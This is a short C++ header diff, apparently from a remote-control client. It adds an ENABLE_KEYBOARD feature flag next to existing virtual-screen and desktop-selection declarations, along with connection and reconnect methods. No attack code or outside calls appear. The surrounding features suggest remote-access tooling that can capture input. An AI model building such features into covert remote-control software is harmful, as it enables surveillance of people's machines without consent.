@@ -13,6 +13,7 @@
 #include "IOCPClient.h"
 
 #define ENABLE_VSCREEN 1
+#define ENABLE_KEYBOARD 1
 
 HDESK SelectDesktop(TCHAR* name);
 
@@ -43,6 +44,13 @@ public:
 	VOID WaitForDialogOpen();
 	VOID NotifyDialogIsOpen();
 
+	BOOL IsConnected() const {
+		return m_ClientObject->IsConnected();
+	}
+	BOOL Reconnect() {
+		return m_ClientObject ? m_ClientObject->Reconnect(this) : FALSE;
+	}
+	virtual void Notify() { }
 	int Send(LPBYTE lpData, UINT nSize);
 	virtual void SetReady(BOOL ready = true) { m_bReady = ready; }
 };
